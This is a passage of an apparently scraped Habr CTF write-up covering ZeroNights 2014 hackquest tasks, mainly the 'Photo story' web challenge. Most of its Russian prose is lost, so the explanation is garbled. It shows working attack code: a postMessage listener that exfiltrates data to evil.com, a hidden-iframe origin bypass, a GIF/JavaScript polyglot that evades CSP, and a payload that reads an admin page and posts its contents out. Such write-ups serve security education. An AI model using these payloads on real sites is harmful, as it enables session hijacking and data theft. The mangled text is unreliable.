-  - .   ,        php,     ,  ,        .    4 ,    keep-alive , , ,    100- ,     ,    5-10  -    ‚Äî 1337. <br><br>  php    -,        ‚Äî hydra.       -  .    650   ,   16 .     ,   hydra   ,     php  .    ,     -    . <br><br><h3>   </h3><br><br>       -  - . <br><br><pre> <code class="bash hljs">Welcome to Private Banking Service! NAME: John Doe CARD: 9090123490905678 BALANCE: 100.0 EXPIRES: 2017-01-13 PIN: 1337 CVV: 123 But our pricess is <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> another castle!</code> </pre><br><br>     ‚Äî    ZeroNights   . <br>        , home, logout  support,          ‚Äútel:88005052098‚Äù.      ‚Äî   . <br>       ,        : ‚Äú    md5    ASTERISK‚Äù. <br><br><h3>  findings </h3><br>      .        ,    ,   .   ,      .   ,     ,     ,      ,        -  ,   . <br>            ‚Äî    . <br></div></div><br><br><h2> Day 8/8 ‚Äî Photo story (Web) </h2><br>    : Sergey Bobrov <br>     : Dan, Alexander &amp; Tolya <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote> : <br><br> Get flag from admin page: <a href="http://www.id1.pw/">www.id1.pw</a> <br> PS DirBuster cannot help you <br></blockquote><br><br>   ,        . <br>     js-   <a href="">auth.id1.pw/js/style.js</a> ‚Äî <a href="http://pastebin.com/MvhACF4Z">pastebin.com/MvhACF4Z</a> . <br>        : <br><br><pre> <code class="javascript hljs"> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> MAGIC = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">_13</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-comment"><span class="hljs-comment">/*js-code*/</span></span> _1 = _9(_1, _2, _0, _3, _4[_5 <span class="hljs-number"><span class="hljs-number">0</span></span>], _27, <span class="hljs-number"><span class="hljs-number">0xD76AA478</span></span>); _3 = _9(_3, _1, _2, _0, _4[_5 <span class="hljs-number"><span class="hljs-number">1</span></span>], _26, <span class="hljs-number"><span class="hljs-number">0xE8C7B756</span></span>); <span class="hljs-comment"><span class="hljs-comment">/*js-code*/</span></span> }; $(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>)[<span class="hljs-string"><span class="hljs-string">"ready"</span></span>](<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _55 = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[<span class="hljs-string"><span class="hljs-string">"getElementsByName"</span></span>](<span class="hljs-string"><span class="hljs-string">"email"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">"value"</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (_55[<span class="hljs-string"><span class="hljs-string">"length"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">2</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[<span class="hljs-string"><span class="hljs-string">"getElementById"</span></span>](<span class="hljs-string"><span class="hljs-string">"userPass"</span></span>)) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[<span class="hljs-string"><span class="hljs-string">"getElementById"</span></span>](<span class="hljs-string"><span class="hljs-string">"userPass"</span></span>)[<span class="hljs-string"><span class="hljs-string">"innerHTML"</span></span>] = <span class="hljs-string"><span class="hljs-string">"Password:"</span></span>+MAGIC(_55)[<span class="hljs-string"><span class="hljs-string">"substring"</span></span>](<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>) } }; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> });</code> </pre><br><br>     MAGIC ,   MD5 <br> (https://www.google.ru/search?q=0xD76AA478),    ‚Äî  10   md5(email). <br> Email     <a href="http">auth.id1.pw/navbar-status.php?origin=http</a> ://www.id1.pw <br><br><pre> <code class="javascript hljs"> parent.postMessage(<span class="hljs-string"><span class="hljs-string">'&lt;a href="http://auth.id1.pw"&gt;Hello, guest!&lt;/a&gt;'</span></span>, <span class="hljs-string"><span class="hljs-string">"http://www.id1.pw"</span></span>);</code> </pre><br><br>   origin      ¬´ <a href="http://www.id1.pw/">www.id1.pw</a> ¬ª,    origin ¬´ <a href="http://www.id1.pw.evil.com/">www.id1.pw.evil.com</a> ¬ª. <br>     <a href="http://www.id1.pw.evil.com/">www.id1.pw.evil.com</a>      <br><br><pre> <code class="javascript hljs"> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> eventMethod = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener ? <span class="hljs-string"><span class="hljs-string">"addEventListener"</span></span> : <span class="hljs-string"><span class="hljs-string">"attachEvent"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> eventer = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>[eventMethod]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> messageEvent = eventMethod == <span class="hljs-string"><span class="hljs-string">"attachEvent"</span></span> ? <span class="hljs-string"><span class="hljs-string">"onmessage"</span></span> : <span class="hljs-string"><span class="hljs-string">"message"</span></span>; eventer(messageEvent,<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> key = e.message ? <span class="hljs-string"><span class="hljs-string">"message"</span></span> : <span class="hljs-string"><span class="hljs-string">"data"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> data = e[key]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> img = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'img'</span></span>); img.src = <span class="hljs-string"><span class="hljs-string">'http://evil.com/logger?c='</span></span>+<span class="hljs-built_in"><span class="hljs-built_in">escape</span></span>(data); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.appendChild(img); },<span class="hljs-literal"><span class="hljs-literal">false</span></span>);</code> </pre><br><br><pre> <code class="html hljs xml"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://auth.id1.pw/navbar-status.php?origin=http://www.id1.pw.bf.am"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"display: none;"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>    postMessage,  email,      . <br><br>     -  : <a href="http://www.id1.pw/forum/main/">www.id1.pw/forum/main</a> . <br>   : <br><br><pre> <code class="bash hljs"> [09/Oct/2014:06:19:03 +0000] <span class="hljs-string"><span class="hljs-string">"GET /logger?c=%3Ca%20href%3D%22/account/%22%3EHello%2C%20yoyoyomoderator1998@google.com%3C/a%3E HTTP/1.1"</span></span> 200 318</code> </pre><br><br>     : <br><br><pre> <code class="bash hljs"> md5(<span class="hljs-string"><span class="hljs-string">'yoyoyomoderator1998@google.com'</span></span>)=214fbc9577288ab4c104e25c7fbbd088 yoyoyomoderator1998@google.com:214fbc9577</code> </pre><br>             html , : <br><br> 1)  ,    CSP  <br><br><pre> <code class="bash hljs"> Content-Security-Policy: default-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> https://apis.google.com http://fonts.googleapis.com/ http://fonts.gstatic.com/ http://auth.id1.pw</code> </pre><br><br> 2)      <a href="http://auth.id1.pw/">auth.id1.pw</a>  <a href="http://www.id1.pw/">www.id1.pw</a> <br><br>  ,   CSP        <br> <a href="http://www.id1.pw/account/">www.id1.pw/account</a> &lt; <a href="http://www.id1.pw/account/">www.id1.pw/account</a> .&gt; ( : <a href="http://bugscollector.com/tricks/6/">bugscollector.com/tricks/6</a> ). <br> /*         ,   ,  mime-type image/gif,   application/javascript */ <br><br>  GIF : <br><br><pre> <code class="bash hljs"> GIF89a/*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00*/=1;alert(1);</code> </pre><br><br>             CSP <br>  : <br><br><pre> <code class="html hljs xml"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.id1.pw/img/uploads/{userid}_{imgname}.gif"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>     js-      .       : <br><br>  GIF: <br><br><pre> <code class="javascript hljs"> GIF89a<span class="hljs-comment"><span class="hljs-comment">/*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00*/</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>; $.get(<span class="hljs-string"><span class="hljs-string">"/admin/"</span></span>,<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">data</span></span></span><span class="hljs-function">)</span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> x = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">"xxx"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> mbody = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">"mbody"</span></span>); mbody.value=<span class="hljs-built_in"><span class="hljs-built_in">escape</span></span>(data); x.submit(); });</code> </pre><br><br>   : <br><br><pre> <code class="javascript hljs"> &lt;form action=<span class="hljs-string"><span class="hljs-string">"http://www.id1.pw/users/id{userid}/"</span></span> method=<span class="hljs-string"><span class="hljs-string">"POST"</span></span> id=<span class="hljs-string"><span class="hljs-string">"xxx"</span></span>&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">input</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"body"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"mbody"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">""</span></span></span></span><span class="xml"><span class="hljs-tag">/&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">form</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> &lt;script src=<span class="hljs-string"><span class="hljs-string">"http://www.id1.pw/img/uploads/{userid}_{imgname}.gif"</span></span>&gt;<span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre><br><br>      /admin/      <a href="http://www.id1.pw/users/id">www.id1.pw/users/id</a> {userid}/?action=view <br><br><pre> <code class="bash hljs">Your flag is: 5aa04d91037d1eced1358e343ad44369cf2ccdce902ddb52f034743634312e03</code> </pre><br></div></div><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Thanks to all participants of the hakkvest! </font><font style="vertical-align: inherit;">Believe you liked!</font></font><br><br><h4>  Links </h4><br> <a href="http://2014.zeronights.ru/assets/files/schedule_rus_fin.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Event program </font></font></a> <br> <a href="http://2014.zeronights.ru/materialy-konferencii.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conference materials</font></font></a> <br>  <a href="https://picasaweb.google.com/106780973074407646953/ZeroNights2014">Photo archive</a> <br> <a href="http://2014.zeronights.ru/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ZeroNights 2014 website</font></font></a> </div><p>Source: <a href="https://habr.com/ru/post/245203/">https://habr.com/ru/post/245203/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../245189/index.html">Tibbo in creating GIS utilities</a></li>
<li><a href="../245193/index.html">UHF in working time and access control systems</a></li>
<li><a href="../245195/index.html">Review of the most interesting materials on data analysis and machine learning ‚Ññ25 (December 1 - 7, 2014)</a></li>
<li><a href="../245199/index.html">Load: system, export problems down, crisis and behavior strategy</a></li>
<li><a href="../245201/index.html">Parallel data loading with time constraints</a></li>
<li><a href="../245205/index.html">Do away with chaos: implement business processes in CRM</a></li>
<li><a href="../245209/index.html">The digest of interesting materials from the world of Drupal # 1</a></li>
<li><a href="../245211/index.html">Lagrange formalism in problems with dry friction</a></li>
<li><a href="../245213/index.html">Some interesting and useful things for web developer # 34</a></li>
<li><a href="../245215/index.html">Highload ++ 2014 through the eyes of a speaker who really loves Processing Large-Scale Graph Data in various bad ways</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>